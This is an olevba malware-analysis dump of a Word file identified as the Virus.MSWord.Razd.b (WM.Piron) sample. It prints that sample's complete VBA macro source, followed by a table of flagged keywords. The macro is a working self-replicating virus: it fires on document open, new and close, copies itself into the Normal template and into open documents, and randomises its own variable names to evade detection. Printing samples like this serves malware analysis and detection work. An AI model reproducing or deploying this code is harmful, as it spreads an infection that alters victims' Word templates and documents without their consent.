olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Razd.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Razd.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'PIRON
Private Sub Document_Open()
Const CCTHB = 1
RNOHH = RNOHH + CCTHB
With NormalTemplate.VBProject.VBComponents(RNOHH).CodeModule
        If .Lines(RNOHH, 1) <> "'PIRON" Then
            .DeleteLines RNOHH, .CountOfLines
            .InsertLines RNOHH, PROMJENA(ThisDocument.VBProject.VBComponents(RNOHH).CodeModule.Lines(RNOHH, _
            ThisDocument.VBProject.VBComponents(RNOHH).CodeModule.CountOfLines))
        End If
End With
With ActiveDocument.VBProject.VBComponents(RNOHH).CodeModule
        If .Lines(RNOHH, 1) <> "'PIRON" Then
            .DeleteLines RNOHH, .CountOfLines
            .InsertLines RNOHH, PROMJENA(ThisDocument.VBProject.VBComponents(RNOHH).CodeModule.Lines(RNOHH, _
            ThisDocument.VBProject.VBComponents(RNOHH).CodeModule.CountOfLines))
        End If
End With
End Sub
Private Function PROMJENA(MUTANT) As String
Dim VARS(1 To 5)
VARS(1) = "RNOHH": VARS(2) = "CCTHB": VARS(3) = "HJHXY"
VARS(4) = "KGEEQ": VARS(5) = "KKRIP"
For HJHXY = 1 To 5
    KGEEQ = Chr(Int(Rnd * 22) + 65) & Chr(Int(Rnd * 22) + 65) & Chr(Int(Rnd * 22) + 65) & _
    Chr(Int(Rnd * 22) + 65) & Chr(Int(Rnd * 22) + 65)
        While InStr(1, MUTANT, VARS(HJHXY), vbTextCompare)
            KKRIP = InStr(1, MUTANT, VARS(HJHXY), vbTextCompare)
            MUTANT = Mid(MUTANT, 1, KKRIP - 1) & KGEEQ & Mid(MUTANT, KKRIP + Len(VARS(HJHXY)), Len(MUTANT) - KKRIP)
        Wend
Next
PROMJENA = MUTANT
End Function
Private Sub Document_New(): Document_Open: End Sub
Private Sub Document_Close(): Document_Open: End Sub
'WM.Piron by e[ax]
'Authorized distribution for Bosnia and Herzegovina

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

